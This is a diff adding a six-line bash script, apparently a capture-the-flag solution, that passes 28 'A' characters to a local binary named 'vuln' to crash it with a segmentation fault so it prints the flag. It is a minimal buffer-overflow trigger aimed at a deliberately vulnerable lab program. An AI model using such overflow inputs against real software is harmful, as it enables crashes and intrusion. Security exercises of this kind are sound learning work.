@@ -1,0 +1,6 @@
+#!/bin/bash
+
+# the goal is to trigger the SIGSEGV signal
+# and it will print the flag on stderr
+./vuln `python3 -c "print('A'*28)"`
+
